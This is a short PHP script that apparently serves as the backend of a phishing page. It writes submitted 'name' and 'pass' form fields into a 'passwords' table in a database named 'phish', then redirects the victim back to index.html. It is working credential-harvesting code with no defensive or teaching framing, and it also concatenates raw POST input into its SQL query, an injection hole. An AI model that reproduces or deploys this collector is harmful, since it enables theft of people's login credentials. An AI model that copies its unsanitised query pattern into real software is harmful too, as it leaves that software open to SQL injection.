<?php
$connect=mysqli_connect('localhost','root','','phish');

header('Location: index.html');

//check connection
if(mysqli_connect_error($connect))
{

	echo 'failed to connect!';
}
else{
}

$sender=$_POST['name'];
$receiver=$_POST['pass'];


mysqli_query($connect,"insert into passwords(first_name,last_name) values('$sender', '$receiver')");

?>